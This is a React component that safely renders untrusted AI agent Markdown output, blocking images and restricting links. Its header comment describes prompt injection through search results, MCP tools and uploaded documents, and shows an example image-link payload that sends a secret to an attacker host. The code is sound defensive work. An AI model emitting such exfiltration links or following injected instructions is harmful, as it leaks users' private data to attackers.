import { memo } from "react";
import type { ReactNode } from "react";

import ReactMarkdown, { defaultUrlTransform } from "react-markdown";
import type { Components } from "react-markdown";
import rehypeSanitize from "rehype-sanitize";
import remarkGfm from "remark-gfm";

import { getLinkDisplayInfo } from "./linkPolicy";

/**
 * Renders agent output (untrusted Markdown) safely.
 *
 * Agent output can contain text injected by web search results, MCP tools or uploaded documents
 * (prompt injection), so it is treated as untrusted:
 * - No raw HTML (no rehype-raw) and `rehype-sanitize` as defense in depth.
 * - Images are never loaded: an external `<img>` would leak data to any host the moment it renders
 *   (e.g. `![x](https://attacker/p.png?d=<secret>)`). The CSP (`img-src 'self' data: blob:`) also blocks them.
 * - Only http(s) and mailto links are clickable; they open in a new tab without opener/referrer and
 *   show the destination domain when the visible text does not already reveal it.
 * - CONSEIN SharePoint links (generated Battlecards) are rendered as a download call-to-action.
 *
 * Memoized: during streaming only the message that changes re-renders.
 */
function SafeMarkdownComponent({ content }: { content: string }) {
    return (
        <div className="markdown-message">
            <ReactMarkdown
                remarkPlugins={[remarkGfm]}
                rehypePlugins={[rehypeSanitize]}
                urlTransform={defaultUrlTransform}
                components={markdownComponents}
            >
                {content}
            </ReactMarkdown>
        </div>
    );
}

const markdownComponents: Components = {
    a({ href, children }) {
        const info = getLinkDisplayInfo(href, textOf(children));
        if (!info) {
            return <>{children}</>;
        }

        if (info.kind === "sharepoint-file") {
            return (
                <a
                    className="message-link message-link--generated-file"
                    href={info.href}
                    target="_blank"
                    rel="noopener noreferrer"
                    title="Abrir archivo generado en SharePoint"
                >
                    Abrir archivo generado
                </a>
            );
        }

        return (
            <>
                <a
                    className="message-inline-link"
                    href={info.href}
                    target="_blank"
                    rel="noopener noreferrer nofollow"
                    title={info.href}
                >
                    {children}
                </a>
                {info.showDomain && (
                    <span className="message-link-domain"> ({info.domain})</span>
                )}
            </>
        );
    },
    img({ alt }) {
        return (
            <span className="markdown-blocked-image" role="note">
                [Imagen omitida{alt ? `: ${alt}` : ""}]
            </span>
        );
    },
    table({ children }) {
        return (
            <div className="markdown-table-block">
                <div
                    className="markdown-table-container"
                    role="region"
                    aria-label="Tabla de comparación desplazable"
                    tabIndex={0}
                >
                    <table className="markdown-table">{children}</table>
                </div>
                <small className="markdown-table-hint">
                    Desliza horizontalmente para ver todas las columnas.
                </small>
            </div>
        );
    },
};

function textOf(children: ReactNode): string {
    if (typeof children === "string" || typeof children === "number") {
        return String(children);
    }
    if (Array.isArray(children)) {
        return children.map(textOf).join("");
    }
    return "";
}

export const SafeMarkdown = memo(SafeMarkdownComponent);
